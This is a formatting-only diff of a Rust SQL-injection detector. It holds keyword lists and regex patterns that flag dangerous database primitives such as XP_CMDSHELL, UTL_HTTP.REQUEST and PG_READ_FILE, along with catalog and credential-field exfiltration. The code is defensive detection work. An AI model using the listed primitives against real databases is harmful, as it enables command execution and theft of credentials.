@@ -16,8 +16,12 @@ use regex::Regex;
 pub struct SqlTautologyEvaluator;
 
 impl L2Evaluator for SqlTautologyEvaluator {
-    fn id(&self) -> &'static str { "sql_tautology" }
-    fn prefix(&self) -> &'static str { "L2 SQL Tautology" }
+    fn id(&self) -> &'static str {
+        "sql_tautology"
+    }
+    fn prefix(&self) -> &'static str {
+        "L2 SQL Tautology"
+    }
 
     #[inline]
 
@@ -52,40 +56,67 @@ impl L2Evaluator for SqlTautologyEvaluator {
 // ── SQL Structural Evaluator ────────────────────────────────────
 
 const SQL_INJECTION_KEYWORDS: &[&str] = &[
-    "OR", "AND", "UNION", "SELECT", "INSERT", "UPDATE", "DELETE",
-    "DROP", "EXEC", "EXECUTE", "CREATE", "ALTER", "HAVING", "WHERE",
-    "ORDER", "GROUP", "GRANT", "REVOKE", "TRUNCATE",
+    "OR", "AND", "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "EXEC", "EXECUTE",
+    "CREATE", "ALTER", "HAVING", "WHERE", "ORDER", "GROUP", "GRANT", "REVOKE", "TRUNCATE",
 ];
 
 const STATEMENT_STARTERS: &[&str] = &[
-    "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE",
-    "ALTER", "EXEC", "EXECUTE", "GRANT", "REVOKE", "TRUNCATE",
+    "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "EXEC", "EXECUTE", "GRANT",
+    "REVOKE", "TRUNCATE",
 ];
 
 const TIME_DELAY_FUNCTIONS: &[&str] = &[
-    "SLEEP", "WAITFOR", "PG_SLEEP", "DBMS_LOCK.SLEEP",
-    "BENCHMARK", "DELAY", "PG_SLEEP_FOR", "PG_SLEEP_UNTIL",
+    "SLEEP",
+    "WAITFOR",
+    "PG_SLEEP",
+    "DBMS_LOCK.SLEEP",
+    "BENCHMARK",
+    "DELAY",
+    "PG_SLEEP_FOR",
+    "PG_SLEEP_UNTIL",
     "DBMS_PIPE.RECEIVE_MESSAGE",
 ];
 
 const ERROR_FUNCTIONS: &[&str] = &[
-    "EXTRACTVALUE", "UPDATEXML", "XMLTYPE", "DBMS_XMLGEN",
-    "UTL_INADDR", "CTXSYS", "GTID_SUBSET", "NAME_CONST",
+    "EXTRACTVALUE",
+    "UPDATEXML",
+    "XMLTYPE",
+    "DBMS_XMLGEN",
+    "UTL_INADDR",
+    "CTXSYS",
+    "GTID_SUBSET",
+    "NAME_CONST",
 ];
 
 const SQL_EXEC_PRIMITIVES: &[&str] = &[
-    "XP_CMDSHELL", "SP_OACREATE", "SP_OAMETHOD", "SP_EXECUTESQL",
-    "UTL_HTTP.REQUEST", "UTL_INADDR.GET_HOST_ADDRESS",
-    "LOAD_FILE", "PG_READ_FILE", "PG_READ_BINARY_FILE", "PG_LS_DIR",
+    "XP_CMDSHELL",
+    "SP_OACREATE",
+    "SP_OAMETHOD",
+    "SP_EXECUTESQL",
+    "UTL_HTTP.REQUEST",
+    "UTL_INADDR.GET_HOST_ADDRESS",
+    "LOAD_FILE",
+    "PG_READ_FILE",
+    "PG_READ_BINARY_FILE",
+    "PG_LS_DIR",
 ];
 
 const SQL_EXFIL_TARGETS: &[&str] = &[
-    "INFORMATION_SCHEMA", "PG_CATALOG", "SQLITE_MASTER",
-    "MYSQL.USER", "SYS.SQL_LOGINS",
+    "INFORMATION_SCHEMA",
+    "PG_CATALOG",
+    "SQLITE_MASTER",
+    "MYSQL.USER",
+    "SYS.SQL_LOGINS",
 ];
 
 const SQL_SENSITIVE_FIELDS: &[&str] = &[
-    "PASSWORD", "PASSWD", "PASS_HASH", "SECRET", "TOKEN", "API_KEY", "AUTH",
+    "PASSWORD",
+    "PASSWD",
+    "PASS_HASH",
+    "SECRET",
+    "TOKEN",
+    "API_KEY",
+    "AUTH",
 ];
 
 pub struct SqlStructuralEvaluator;
@@ -129,8 +160,9 @@ impl SqlStructuralEvaluator {
         static CHR_CHAIN_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
             Regex::new(r"(?is)(?:(?:chr|char)\s*\(\s*\d{1,3}\s*\)\s*(?:\|\||\+)\s*){3,}(?:chr|char)\s*\(\s*\d{1,3}\s*\)").unwrap()
         });
-        static CHR_CALL_RE: std::sync::LazyLock<Regex> =
-            std::sync::LazyLock::new(|| Regex::new(r"(?i)(?:chr|char)\s*\(\s*(\d{1,3})\s*\)").unwrap());
+        static CHR_CALL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)(?:chr|char)\s*\(\s*(\d{1,3})\s*\)").unwrap()
+        });
         const SUSPICIOUS: &[&str] = &[
             "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "EXEC", "WAITFOR", "SLEEP",
         ];
@@ -141,8 +173,12 @@ impl SqlStructuralEvaluator {
             let mut out = String::new();
 
             for caps in CHR_CALL_RE.captures_iter(snippet) {
-                let Some(num_match) = caps.get(1) else { continue };
-                let Ok(code) = num_match.as_str().parse::<u32>() else { continue };
+                let Some(num_match) = caps.get(1) else {
+                    continue;
+                };
+                let Ok(code) = num_match.as_str().parse::<u32>() else {
+                    continue;
+                };
                 let ch = char::from_u32(code).unwrap_or('\0');
                 if ch.is_ascii() && !ch.is_ascii_control() {
                     out.push(ch);
@@ -179,7 +215,8 @@ impl SqlStructuralEvaluator {
 
     fn detect_string_termination(&self, input: &str, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter()
+        let meaningful: Vec<_> = tokens
+            .iter()
             .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
             .collect();
 
@@ -189,7 +226,8 @@ impl SqlStructuralEvaluator {
             let (next_type, next_val, _) = meaningful[i + 1];
 
             if *cur_type == SqlTokenType::String {
-                let is_injection = matches!(next_type,
+                let is_injection = matches!(
+                    next_type,
                     SqlTokenType::Keyword | SqlTokenType::Operator | SqlTokenType::BooleanOp
                 ) || (*next_type == SqlTokenType::Separator && next_val == ";");
 
@@ -221,15 +259,19 @@ impl SqlStructuralEvaluator {
                 if !rest.is_empty() {
                     let tokenizer = SqlTokenizer;
                     let rest_stream = tokenizer.tokenize(rest);
-                    let rest_meaningful: Vec<_> = rest_stream.all().iter()
+                    let rest_meaningful: Vec<_> = rest_stream
+                        .all()
+                        .iter()
                         .filter(|t| t.token_type != SqlTokenType::Whitespace)
                         .collect();
 
                     if let Some(first) = rest_meaningful.first() {
                         let val_upper = first.value.to_uppercase();
-                        let is_injection_kw = matches!(first.token_type,
+                        let is_injection_kw = matches!(
+                            first.token_type,
                             SqlTokenType::Keyword | SqlTokenType::BooleanOp
-                        ) || SQL_INJECTION_KEYWORDS.contains(&val_upper.as_str());
+                        ) || SQL_INJECTION_KEYWORDS
+                            .contains(&val_upper.as_str());
 
                         if is_injection_kw {
                             detections.push(L2Detection {
@@ -256,7 +298,8 @@ impl SqlStructuralEvaluator {
 
     fn detect_union_extraction(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter()
+        let meaningful: Vec<_> = tokens
+            .iter()
             .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
             .collect();
 
@@ -289,7 +332,8 @@ impl SqlStructuralEvaluator {
 
     fn detect_stacked_execution(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter()
+        let meaningful: Vec<_> = tokens
+            .iter()
             .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
             .collect();
 
@@ -299,7 +343,9 @@ impl SqlStructuralEvaluator {
             if *cur_type == SqlTokenType::Separator && cur_val == ";" {
                 let (next_type, next_val, _) = meaningful[i + 1];
                 let val_upper = next_val.to_uppercase();
-                if *next_type == SqlTokenType::Keyword && STATEMENT_STARTERS.contains(&val_upper.as_str()) {
+                if *next_type == SqlTokenType::Keyword
+                    && STATEMENT_STARTERS.contains(&val_upper.as_str())
+                {
                     detections.push(L2Detection {
                         detection_type: "stacked_execution".into(),
                         confidence: 0.90,
@@ -321,7 +367,8 @@ impl SqlStructuralEvaluator {
 
     fn detect_time_oracle(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter()
+        let meaningful: Vec<_> = tokens
+            .iter()
             .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
             .collect();
 
@@ -401,7 +448,8 @@ impl SqlStructuralEvaluator {
 
     fn detect_error_oracle(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter()
+        let meaningful: Vec<_> = tokens
+            .iter()
             .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
             .collect();
 
@@ -417,14 +465,20 @@ impl SqlStructuralEvaluator {
                 let mut depth = 0i32;
                 let mut has_subquery = false;
                 for j in (i + 1)..meaningful.len() {
-                    if meaningful[j].0 == SqlTokenType::ParenOpen { depth += 1; }
-                    if meaningful[j].0 == SqlTokenType::ParenClose { depth -= 1; }
+                    if meaningful[j].0 == SqlTokenType::ParenOpen {
+                        depth += 1;
+                    }
+                    if meaningful[j].0 == SqlTokenType::ParenClose {
+                        depth -= 1;
+                    }
                     if meaningful[j].0 == SqlTokenType::Keyword
                         && meaningful[j].1.eq_ignore_ascii_case("SELECT")
                     {
                         has_subquery = true;
                     }
-                    if depth == 0 { break; }
+                    if depth == 0 {
+                        break;
+                    }
                 }
 
                 detections.push(L2Detection {
@@ -448,7 +502,8 @@ impl SqlStructuralEvaluator {
 
     fn detect_comment_truncation(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter()
+        let meaningful: Vec<_> = tokens
+            .iter()
             .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
             .collect();
 
@@ -459,30 +514,44 @@ impl SqlStructuralEvaluator {
             let is_comment = *tok_type == SqlTokenType::Separator
                 && (tok_val.starts_with("--") || tok_val == "#");
 
-            if !is_comment { continue; }
+            if !is_comment {
+                continue;
+            }
 
             let has_prior_injection = meaningful[..i].iter().any(|(t, v, _)| {
                 let v_upper = v.to_uppercase();
                 (*t == SqlTokenType::BooleanOp && (v_upper == "OR" || v_upper == "AND"))
-                    || (*t == SqlTokenType::Keyword && STATEMENT_STARTERS.contains(&v_upper.as_str()))
+                    || (*t == SqlTokenType::Keyword
+                        && STATEMENT_STARTERS.contains(&v_upper.as_str()))
                     || (*t == SqlTokenType::Keyword && v_upper == "UNION")
                     || (*t == SqlTokenType::Keyword && v_upper == "HAVING")
                     || (*t == SqlTokenType::Keyword && v_upper == "ORDER")
             });
 
             if has_prior_injection {
-                let comment_preview = if tok_val.len() > 2 { &tok_val[..2] } else { tok_val.as_str() };
+                let comment_preview = if tok_val.len() > 2 {
+                    &tok_val[..2]
+                } else {
+                    tok_val.as_str()
+                };
                 detections.push(L2Detection {
                     detection_type: "comment_truncation".into(),
                     confidence: 0.82,
-                    detail: format!("SQL comment ({}) after injection context — truncates remaining query", comment_preview),
+                    detail: format!(
+                        "SQL comment ({}) after injection context — truncates remaining query",
+                        comment_preview
+                    ),
                     position: *tok_pos,
                     evidence: vec![ProofEvidence {
                         operation: EvidenceOperation::SyntaxRepair,
                         matched_input: tok_val.clone(),
-                        interpretation: "Input injects comment syntax to truncate remaining SQL statement".into(),
+                        interpretation:
+                            "Input injects comment syntax to truncate remaining SQL statement"
+                                .into(),
                         offset: *tok_pos,
-                        property: "Injected SQL comments must not truncate application query semantics".into(),
+                        property:
+                            "Injected SQL comments must not truncate application query semantics"
+                                .into(),
                     }],
                 });
             }
@@ -492,7 +561,8 @@ impl SqlStructuralEvaluator {
 
     fn detect_file_exec_primitives(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter()
+        let meaningful: Vec<_> = tokens
+            .iter()
             .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
             .collect();
 
@@ -524,8 +594,12 @@ impl SqlStructuralEvaluator {
 
             if val_upper == "COPY" {
                 let lookahead = &meaningful[i + 1..meaningful.len().min(i + 14)];
-                let has_to = lookahead.iter().any(|(_, v, _)| v.eq_ignore_ascii_case("TO"));
-                let has_program = lookahead.iter().any(|(_, v, _)| v.eq_ignore_ascii_case("PROGRAM"));
+                let has_to = lookahead
+                    .iter()
+                    .any(|(_, v, _)| v.eq_ignore_ascii_case("TO"));
+                let has_program = lookahead
+                    .iter()
+                    .any(|(_, v, _)| v.eq_ignore_ascii_case("PROGRAM"));
                 if has_to && has_program {
                     detections.push(L2Detection {
                         detection_type: "file_exec_primitive".into(),
@@ -556,7 +630,9 @@ impl SqlStructuralEvaluator {
                             matched_input: format!("INTO {}", next),
                             interpretation: "Input introduces SQL file-write primitive".into(),
                             offset: *tok_pos,
-                            property: "User input must not introduce SQL filesystem write primitives".into(),
+                            property:
+                                "User input must not introduce SQL filesystem write primitives"
+                                    .into(),
                         }],
                     });
                 }
@@ -568,20 +644,22 @@ impl SqlStructuralEvaluator {
 
     fn detect_catalog_exfiltration(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter()
+        let meaningful: Vec<_> = tokens
+            .iter()
             .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
             .collect();
 
         let has_select = meaningful.iter().any(|(t, v, _)| {
-            *t == SqlTokenType::Keyword && (v.eq_ignore_ascii_case("SELECT") || v.eq_ignore_ascii_case("UNION"))
+            *t == SqlTokenType::Keyword
+                && (v.eq_ignore_ascii_case("SELECT") || v.eq_ignore_ascii_case("UNION"))
         });
         if !has_select {
             return detections;
         }
 
-        let union_present = meaningful.iter().any(|(t, v, _)| {
-            *t == SqlTokenType::Keyword && v.eq_ignore_ascii_case("UNION")
-        });
+        let union_present = meaningful
+            .iter()
+            .any(|(t, v, _)| *t == SqlTokenType::Keyword && v.eq_ignore_ascii_case("UNION"));
 
         for (tok_type, tok_val, tok_pos) in meaningful {
             if !matches!(tok_type, SqlTokenType::Identifier | SqlTokenType::Keyword) {
@@ -610,7 +688,8 @@ impl SqlStructuralEvaluator {
 
     fn detect_case_time_oracle(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter()
+        let meaningful: Vec<_> = tokens
+            .iter()
             .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
             .collect();
 
@@ -640,14 +719,20 @@ impl SqlStructuralEvaluator {
                 detections.push(L2Detection {
                     detection_type: "case_time_oracle".into(),
                     confidence: 0.91,
-                    detail: "CASE/WHEN conditional with timing primitive indicates blind SQL oracle".into(),
+                    detail:
+                        "CASE/WHEN conditional with timing primitive indicates blind SQL oracle"
+                            .into(),
                     position: *tok_pos,
                     evidence: vec![ProofEvidence {
                         operation: EvidenceOperation::PayloadInject,
                         matched_input: "CASE ... WHEN ... <time_fn>() ... END".into(),
-                        interpretation: "Input creates a conditional timing side-channel in SQL execution".into(),
+                        interpretation:
+                            "Input creates a conditional timing side-channel in SQL execution"
+                                .into(),
                         offset: *tok_pos,
-                        property: "SQL conditionals must not expose attacker-controlled timing oracles".into(),
+                        property:
+                            "SQL conditionals must not expose attacker-controlled timing oracles"
+                                .into(),
                     }],
                 });
             }
@@ -686,7 +771,10 @@ impl SqlStructuralEvaluator {
             if *tok_type != SqlTokenType::Number {
                 continue;
             }
-            let Some(hex) = tok_val.strip_prefix("0x").or_else(|| tok_val.strip_prefix("0X")) else {
+            let Some(hex) = tok_val
+                .strip_prefix("0x")
+                .or_else(|| tok_val.strip_prefix("0X"))
+            else {
                 continue;
             };
             if hex.len() < 4 || hex.len() % 2 != 0 || !hex.chars().all(|c| c.is_ascii_hexdigit()) {
@@ -742,16 +830,22 @@ impl SqlStructuralEvaluator {
             return detections;
         }
 
-        let meaningful: Vec<_> = tokens.iter()
+        let meaningful: Vec<_> = tokens
+            .iter()
             .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
             .collect();
 
         for i in 0..meaningful.len().saturating_sub(3) {
             let (tok_type, tok_val, tok_pos) = meaningful[i];
-            if *tok_type != SqlTokenType::BooleanOp || !(tok_val.eq_ignore_ascii_case("OR") || tok_val.eq_ignore_ascii_case("AND")) {
+            if *tok_type != SqlTokenType::BooleanOp
+                || !(tok_val.eq_ignore_ascii_case("OR") || tok_val.eq_ignore_ascii_case("AND"))
+            {
                 continue;
             }
-            if meaningful[i + 1].0 != SqlTokenType::Number || meaningful[i + 2].0 != SqlTokenType::Operator || meaningful[i + 3].0 != SqlTokenType::Number {
+            if meaningful[i + 1].0 != SqlTokenType::Number
+                || meaningful[i + 2].0 != SqlTokenType::Operator
+                || meaningful[i + 3].0 != SqlTokenType::Number
+            {
                 continue;
             }
             if meaningful[i + 2].1 != "=" {
@@ -798,7 +892,8 @@ impl SqlStructuralEvaluator {
                 }
                 let inner = &input[markers[i].2..markers[j].1];
                 let inner_upper = inner.to_uppercase();
-                let has_stacked = STATEMENT_STARTERS.iter()
+                let has_stacked = STATEMENT_STARTERS
+                    .iter()
                     .any(|kw| inner_upper.contains(&format!("; {}", kw)));
                 if has_stacked {
                     detections.push(L2Detection {
@@ -829,7 +924,11 @@ impl SqlStructuralEvaluator {
 
         let mut detections = Vec::new();
         let upper = input.to_uppercase();
-        if !(upper.contains("[MASTER]") || upper.contains("[MSDB]") || upper.contains("[TEMPDB]") || upper.contains("[SYSOBJECTS]")) {
+        if !(upper.contains("[MASTER]")
+            || upper.contains("[MSDB]")
+            || upper.contains("[TEMPDB]")
+            || upper.contains("[SYSOBJECTS]"))
+        {
             return detections;
         }
 
@@ -907,9 +1006,14 @@ impl SqlStructuralEvaluator {
         let mut detections = Vec::new();
         for caps in WINDOW_EXFIL_RE.captures_iter(input) {
             let Some(full) = caps.get(0) else { continue };
-            let Some(order_col) = caps.get(1) else { continue };
+            let Some(order_col) = caps.get(1) else {
+                continue;
+            };
             let upper_col = order_col.as_str().to_uppercase();
-            if !SQL_SENSITIVE_FIELDS.iter().any(|field| upper_col.contains(field)) {
+            if !SQL_SENSITIVE_FIELDS
+                .iter()
+                .any(|field| upper_col.contains(field))
+            {
                 continue;
             }
 
@@ -973,40 +1077,63 @@ impl SqlStructuralEvaluator {
     }
     fn detect_order_by_injection(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter().filter(|(t, _, _)| *t != SqlTokenType::Whitespace).collect();
+        let meaningful: Vec<_> = tokens
+            .iter()
+            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
+            .collect();
         for i in 0..meaningful.len().saturating_sub(2) {
             let (tok_type, tok_val, tok_pos) = meaningful[i];
-            if *tok_type == SqlTokenType::Keyword && tok_val.eq_ignore_ascii_case("ORDER") && meaningful[i+1].1.eq_ignore_ascii_case("BY") {
-                let next = meaningful[i+2];
+            if *tok_type == SqlTokenType::Keyword
+                && tok_val.eq_ignore_ascii_case("ORDER")
+                && meaningful[i + 1].1.eq_ignore_ascii_case("BY")
+            {
+                let next = meaningful[i + 2];
                 if next.0 == SqlTokenType::Number {
                     detections.push(L2Detection {
                         detection_type: "order_by_injection".into(),
                         confidence: 0.85,
-                        detail: format!("ORDER BY numeric position (column enumeration): ORDER BY {}", next.1),
+                        detail: format!(
+                            "ORDER BY numeric position (column enumeration): ORDER BY {}",
+                            next.1
+                        ),
                         position: *tok_pos,
                         evidence: vec![ProofEvidence {
                             operation: EvidenceOperation::PayloadInject,
                             matched_input: format!("ORDER BY {}", next.1),
-                            interpretation: "Input uses ORDER BY numeric index to infer column count".into(),
+                            interpretation:
+                                "Input uses ORDER BY numeric index to infer column count".into(),
                             offset: *tok_pos,
-                            property: "Column count must not be enumerable via ordinal ORDER BY".into(),
+                            property: "Column count must not be enumerable via ordinal ORDER BY"
+                                .into(),
                         }],
                     });
-                } else if next.1.eq_ignore_ascii_case("IF") || next.1.eq_ignore_ascii_case("CASE") || (next.0 == SqlTokenType::Identifier && TIME_DELAY_FUNCTIONS.contains(&next.1.to_uppercase().as_str())) {
+                } else if next.1.eq_ignore_ascii_case("IF")
+                    || next.1.eq_ignore_ascii_case("CASE")
+                    || (next.0 == SqlTokenType::Identifier
+                        && TIME_DELAY_FUNCTIONS.contains(&next.1.to_uppercase().as_str()))
+                {
                     detections.push(L2Detection {
                         detection_type: "order_by_injection".into(),
                         confidence: 0.95,
-                        detail: "ORDER BY clause contains conditional logic or timing primitive".into(),
+                        detail: "ORDER BY clause contains conditional logic or timing primitive"
+                            .into(),
                         position: *tok_pos,
                         evidence: vec![ProofEvidence {
                             operation: EvidenceOperation::PayloadInject,
                             matched_input: format!("ORDER BY {}", next.1),
-                            interpretation: "Input injects logic into ORDER BY for boolean/time inference".into(),
+                            interpretation:
+                                "Input injects logic into ORDER BY for boolean/time inference"
+                                    .into(),
                             offset: *tok_pos,
-                            property: "ORDER BY clauses must not contain attacker-controlled expressions".into(),
+                            property:
+                                "ORDER BY clauses must not contain attacker-controlled expressions"
+                                    .into(),
                         }],
                     });
-                } else if next.0 == SqlTokenType::ParenOpen && i + 3 < meaningful.len() && meaningful[i+3].1.eq_ignore_ascii_case("SELECT") {
+                } else if next.0 == SqlTokenType::ParenOpen
+                    && i + 3 < meaningful.len()
+                    && meaningful[i + 3].1.eq_ignore_ascii_case("SELECT")
+                {
                     detections.push(L2Detection {
                         detection_type: "order_by_injection".into(),
                         confidence: 0.95,
@@ -1017,7 +1144,9 @@ impl SqlStructuralEvaluator {
                             matched_input: "ORDER BY (SELECT ...".into(),
                             interpretation: "Input injects a subquery into ORDER BY".into(),
                             offset: *tok_pos,
-                            property: "ORDER BY clauses must not contain attacker-controlled subqueries".into(),
+                            property:
+                                "ORDER BY clauses must not contain attacker-controlled subqueries"
+                                    .into(),
                         }],
                     });
                 }
@@ -1028,13 +1157,19 @@ impl SqlStructuralEvaluator {
 
     fn detect_having_injection(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter().filter(|(t, _, _)| *t != SqlTokenType::Whitespace).collect();
+        let meaningful: Vec<_> = tokens
+            .iter()
+            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
+            .collect();
         for i in 0..meaningful.len().saturating_sub(2) {
             let (tok_type, tok_val, tok_pos) = meaningful[i];
             if *tok_type == SqlTokenType::Keyword && tok_val.eq_ignore_ascii_case("HAVING") {
-                let next1 = meaningful[i+1];
+                let next1 = meaningful[i + 1];
                 if next1.1 == "1" || next1.0 == SqlTokenType::Number {
-                    if i + 3 < meaningful.len() && meaningful[i+2].1 == "=" && meaningful[i+3].0 == SqlTokenType::Number {
+                    if i + 3 < meaningful.len()
+                        && meaningful[i + 2].1 == "="
+                        && meaningful[i + 3].0 == SqlTokenType::Number
+                    {
                         detections.push(L2Detection {
                             detection_type: "having_injection".into(),
                             confidence: 0.90,
@@ -1057,23 +1192,34 @@ impl SqlStructuralEvaluator {
 
     fn detect_group_by_injection(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter().filter(|(t, _, _)| *t != SqlTokenType::Whitespace).collect();
+        let meaningful: Vec<_> = tokens
+            .iter()
+            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
+            .collect();
         for i in 0..meaningful.len().saturating_sub(2) {
             let (tok_type, tok_val, tok_pos) = meaningful[i];
-            if *tok_type == SqlTokenType::Keyword && tok_val.eq_ignore_ascii_case("GROUP") && meaningful[i+1].1.eq_ignore_ascii_case("BY") {
-                let next = meaningful[i+2];
+            if *tok_type == SqlTokenType::Keyword
+                && tok_val.eq_ignore_ascii_case("GROUP")
+                && meaningful[i + 1].1.eq_ignore_ascii_case("BY")
+            {
+                let next = meaningful[i + 2];
                 if next.0 == SqlTokenType::Number {
                     detections.push(L2Detection {
                         detection_type: "group_by_injection".into(),
                         confidence: 0.85,
-                        detail: format!("GROUP BY numeric position (column enumeration): GROUP BY {}", next.1),
+                        detail: format!(
+                            "GROUP BY numeric position (column enumeration): GROUP BY {}",
+                            next.1
+                        ),
                         position: *tok_pos,
                         evidence: vec![ProofEvidence {
                             operation: EvidenceOperation::PayloadInject,
                             matched_input: format!("GROUP BY {}", next.1),
-                            interpretation: "Input uses GROUP BY numeric index to infer column count".into(),
+                            interpretation:
+                                "Input uses GROUP BY numeric index to infer column count".into(),
                             offset: *tok_pos,
-                            property: "Column count must not be enumerable via ordinal GROUP BY".into(),
+                            property: "Column count must not be enumerable via ordinal GROUP BY"
+                                .into(),
                         }],
                     });
                 }
@@ -1086,7 +1232,7 @@ impl SqlStructuralEvaluator {
         static SUBQUERY_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
             Regex::new(r"(?is)\(\s*SELECT\s+(?:(?:\*|MAX|MIN|COUNT|SUM|AVG)\s*\(.*?\)|[A-Za-z0-9_,\.\s]+)\s+FROM\s+[A-Za-z0-9_]+\s*(?:WHERE|GROUP|HAVING|ORDER|LIMIT)?.*?\)").unwrap()
         });
-        
+
         let mut detections = Vec::new();
         for m in SUBQUERY_RE.find_iter(input) {
             detections.push(L2Detection {
@@ -1097,7 +1243,8 @@ impl SqlStructuralEvaluator {
                 evidence: vec![ProofEvidence {
                     operation: EvidenceOperation::PayloadInject,
                     matched_input: extract_context(input, m.start(), 64),
-                    interpretation: "Input uses a subquery to exfiltrate or test unauthorized data".into(),
+                    interpretation: "Input uses a subquery to exfiltrate or test unauthorized data"
+                        .into(),
                     offset: m.start(),
                     property: "User input must not execute unauthorized SELECT subqueries".into(),
                 }],
@@ -1120,7 +1267,8 @@ impl SqlStructuralEvaluator {
                 evidence: vec![ProofEvidence {
                     operation: EvidenceOperation::PayloadInject,
                     matched_input: extract_context(input, m.start(), 32),
-                    interpretation: "Input stores a concatenated subquery for later execution".into(),
+                    interpretation: "Input stores a concatenated subquery for later execution"
+                        .into(),
                     offset: m.start(),
                     property: "Input must not store delayed-execution SQL payloads".into(),
                 }],
@@ -1157,11 +1305,21 @@ impl SqlStructuralEvaluator {
 
     fn detect_cte_injection(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let mut detections = Vec::new();
-        let meaningful: Vec<_> = tokens.iter().filter(|(t, _, _)| *t != SqlTokenType::Whitespace).collect();
+        let meaningful: Vec<_> = tokens
+            .iter()
+            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
+            .collect();
         for i in 0..meaningful.len().saturating_sub(3) {
             let (tok_type, tok_val, tok_pos) = meaningful[i];
-            if matches!(tok_type, SqlTokenType::Keyword | SqlTokenType::Identifier) && tok_val.eq_ignore_ascii_case("WITH") {
-                if matches!(meaningful[i+2].0, SqlTokenType::Keyword | SqlTokenType::Identifier) && meaningful[i+2].1.eq_ignore_ascii_case("AS") && meaningful[i+3].0 == SqlTokenType::ParenOpen {
+            if matches!(tok_type, SqlTokenType::Keyword | SqlTokenType::Identifier)
+                && tok_val.eq_ignore_ascii_case("WITH")
+            {
+                if matches!(
+                    meaningful[i + 2].0,
+                    SqlTokenType::Keyword | SqlTokenType::Identifier
+                ) && meaningful[i + 2].1.eq_ignore_ascii_case("AS")
+                    && meaningful[i + 3].0 == SqlTokenType::ParenOpen
+                {
                     detections.push(L2Detection {
                         detection_type: "cte_injection".into(),
                         confidence: 0.92,
@@ -1183,13 +1341,22 @@ impl SqlStructuralEvaluator {
 
     fn detect_db_specific_primitives(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
         let db_primitives = [
-            "LO_IMPORT", "LO_EXPORT", "PG_READ_FILE", "PG_READ_BINARY_FILE", "PG_LS_DIR",
-            "LOAD_FILE", 
-            "XP_CMDSHELL", "SP_OACREATE", "OPENROWSET", "OPENDATASOURCE",
-            "UTL_HTTP.REQUEST", "DBMS_PIPE.RECEIVE_MESSAGE", "SYS.DBMS_EXPORT",
-            "LOAD_EXTENSION"
+            "LO_IMPORT",
+            "LO_EXPORT",
+            "PG_READ_FILE",
+            "PG_READ_BINARY_FILE",
+            "PG_LS_DIR",
+            "LOAD_FILE",
+            "XP_CMDSHELL",
+            "SP_OACREATE",
+            "OPENROWSET",
+            "OPENDATASOURCE",
+            "UTL_HTTP.REQUEST",
+            "DBMS_PIPE.RECEIVE_MESSAGE",
+            "SYS.DBMS_EXPORT",
+            "LOAD_EXTENSION",
         ];
-        
+
         let mut detections = Vec::new();
         for (tok_type, tok_val, tok_pos) in tokens {
             if matches!(tok_type, SqlTokenType::Identifier | SqlTokenType::Keyword) {
@@ -1203,19 +1370,25 @@ impl SqlStructuralEvaluator {
                         evidence: vec![ProofEvidence {
                             operation: EvidenceOperation::PayloadInject,
                             matched_input: tok_val.clone(),
-                            interpretation: "Input invokes highly privileged database execution primitives".into(),
+                            interpretation:
+                                "Input invokes highly privileged database execution primitives"
+                                    .into(),
                             offset: *tok_pos,
-                            property: "User input must not access dangerous DB-specific primitives".into(),
+                            property: "User input must not access dangerous DB-specific primitives"
+                                .into(),
                         }],
                     });
                 }
             }
         }
-        
-        let meaningful: Vec<_> = tokens.iter().filter(|(t, _, _)| *t != SqlTokenType::Whitespace).collect();
+
+        let meaningful: Vec<_> = tokens
+            .iter()
+            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
+            .collect();
         for i in 0..meaningful.len().saturating_sub(1) {
             let val1 = meaningful[i].1.to_uppercase();
-            let val2 = meaningful[i+1].1.to_uppercase();
+            let val2 = meaningful[i + 1].1.to_uppercase();
